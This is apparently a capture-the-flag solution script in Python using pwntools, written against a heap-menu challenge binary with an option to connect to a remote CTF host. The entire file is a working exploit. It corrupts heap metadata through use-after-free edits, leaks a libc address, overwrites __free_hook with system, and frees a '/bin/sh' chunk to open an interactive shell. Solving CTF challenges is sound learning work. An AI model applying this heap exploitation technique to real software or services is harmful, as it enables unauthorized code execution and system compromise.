from pwn import *

e = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("hitme.tasteless.eu", 10601)
else:
  p = process(e.path
  )
  #{"LD_PRELOAD": libc.path})

def add(size, data="AAAA"):
  p.sendline("a")
  p.sendlineafter("?", str(size - 1))
  p.sendlineafter("?", "h")
  p.sendlineafter(":", data)

  p.recvuntil(">")

def free(idx):
  p.sendline("d")
  p.sendlineafter("?", str(idx))

  p.recvuntil(">")

def edit(idx, size, data="AAAA"):
  p.sendline("e")
  p.sendlineafter("?", str(idx))
  p.sendlineafter("?", str(size - 1))
  p.sendlineafter(":", data)

  p.recvuntil(">")

p.recvuntil(">")


add(0x88)
add(0x50)

free(0)
edit(0, 0x28, "\x00" + "A" * 8)

free(1)

add(0x88)
free(0)

add(0x88, "A" * 6 + "\x37")

p.sendline("s")
p.sendlineafter("?", "0")
p.recvuntil("37 0a")

leak = int("".join(p.recvline().strip().split(" ")[::-1]), 16) + 0x00007f9c795c6000 - 0x7f9c797aac00
print("{:#x}".format(leak))

p.recvuntil(">")

free(0)

add(0x218, "/bin/sh".ljust(0x10, "\x00") + p64(0) + p64(leak + libc.symbols["__free_hook"]))
add(0x28, p64(leak + libc.symbols["system"]))

p.sendline("d")
p.sendlineafter("?", "0")

p.interactive()
